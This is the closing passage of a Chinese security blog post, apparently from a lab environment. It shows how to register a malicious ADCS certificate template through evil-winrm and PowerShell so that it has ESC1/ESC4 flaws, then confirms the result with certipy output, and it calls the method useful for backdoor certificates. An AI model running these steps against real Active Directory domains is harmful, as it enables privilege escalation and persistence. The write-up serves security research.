+</span></span><span style="display:flex;"><span>                             222,
+</span></span><span style="display:flex;"><span>                             255,
+</span></span><span style="display:flex;"><span>                             <span style="color:#ae81ff">255</span>
+</span></span><span style="display:flex;"><span>                         <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>之后将这个json以及脚本传递到目标上去，运行如下命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; import-module .<span style="color:#ae81ff">\A</span>DCSTemplate.psm1 <span style="color:#75715e">#导入模块</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; New-ADCSTemplate -DisplayName ESC -JSON <span style="color:#f92672">(</span>Get-Content .<span style="color:#ae81ff">\E</span>SC1.json -Raw<span style="color:#f92672">)</span> -Publish -Identity <span style="color:#e6db74">&#34;WACKADCS\PKI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Admins&#34;</span> <span style="color:#75715e">#注册模板并且指定可请求组</span>
+</span></span></code></pre></div><p>运行完毕后可以看到也是成功注册</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/adcs-test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">35</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">16</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc.wackadcs.com&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : wackadcs-DC-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc.wackadcs.com
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>wackadcs-DC-CA, DC<span style="color:#f92672">=</span>wackadcs, DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 19F9595699CD919E41F8D2620299CFA0
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-08-28 08:34:40+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2030-08-28 08:44:40+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : WACKADCS.COM<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : WACKADCS.COM<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : WACKADCS.COM<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : WACKADCS.COM<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Template Name                       : ESC
+</span></span><span style="display:flex;"><span>    Display Name                        : ESC
+</span></span><span style="display:flex;"><span>    Certificate Authorities             : wackadcs-DC-CA
+</span></span><span style="display:flex;"><span>    Enabled                             : True
+</span></span><span style="display:flex;"><span>    Client Authentication               : True
+</span></span><span style="display:flex;"><span>    Enrollment Agent                    : False
+</span></span><span style="display:flex;"><span>    Any Purpose                         : False
+</span></span><span style="display:flex;"><span>    Enrollee Supplies Subject           : True
+</span></span><span style="display:flex;"><span>    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span style="display:flex;"><span>    Extended Key Usage                  : Client Authentication
+</span></span><span style="display:flex;"><span>    Requires Manager Approval           : False
+</span></span><span style="display:flex;"><span>    Requires Key Archival               : False
+</span></span><span style="display:flex;"><span>    Authorized Signatures Required      : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Schema Version                      : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    Validity Period                     : <span style="color:#ae81ff">1</span> year
+</span></span><span style="display:flex;"><span>    Renewal Period                      : <span style="color:#ae81ff">6</span> weeks
+</span></span><span style="display:flex;"><span>    Minimum RSA Key Length              : <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    Template Created                    : 2025-08-29T11:30:30+00:00
+</span></span><span style="display:flex;"><span>    Template Last Modified              : 2025-08-29T11:30:30+00:00
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Enrollment Permissions
+</span></span><span style="display:flex;"><span>        Enrollment Rights               : WACKADCS.COM<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>      Object Control Permissions
+</span></span><span style="display:flex;"><span>        Owner                           : WACKADCS.COM<span style="color:#ae81ff">\t</span>estuser
+</span></span><span style="display:flex;"><span>        Full Control Principals         : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Owner Principals          : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Dacl Principals           : WACKADCS.COM<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\L</span>ocal System
+</span></span><span style="display:flex;"><span>                                          WACKADCS.COM<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : WACKADCS.COM<span style="color:#ae81ff">\P</span>KIAdmins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User ACL Principals             : WACKADCS.COM<span style="color:#ae81ff">\t</span>estuser
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</span></span><span style="display:flex;"><span>      ESC4                              : Template is owned by user.
+</span></span></code></pre></div><p>利用这个脚本的好处是方便，且可以直接指定可请求证书组，在创建后门证书的时候好用，但他基于rsat域模块，且最近的更新也在7年前了，所以还是按需使用。</p>
+<h2 id="总结">总结
+</h2><p>以上就是本文的全部内容了，在本文完结并提交前，我确定网上并没有出现过如何利用注册恶意模板并利用的手法，尽管其其实并不算一个很难的角度，不过想要绕过桌面会话来创建一个模板确实需要对ca的底层交互了解很多，等过段时间有时间了我会再测试并书写一篇黄金证书的攻击手段</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/scepter/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">scepter-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">不可转发情况下的约束委派攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/dnsadmin/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">基于DnsAdmin组的dns热重载权限维持及衍生情况</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
